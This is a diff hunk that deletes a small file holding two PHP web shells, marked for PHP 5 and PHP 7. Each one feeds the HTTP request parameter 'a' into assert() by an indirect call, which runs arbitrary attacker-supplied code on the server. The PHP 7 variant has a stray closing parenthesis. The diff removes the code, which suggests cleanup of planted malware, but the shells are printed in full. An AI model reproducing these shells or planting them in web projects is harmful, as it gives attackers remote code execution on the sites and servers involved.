@@ -1,9 +1,0 @@
-//php5
-<?php
-$a='assert';
-[""=>$a($_REQUEST['a'])];
-?>
-//php7
-<?php
-'assert'($_REQUEST['a']));
-?>
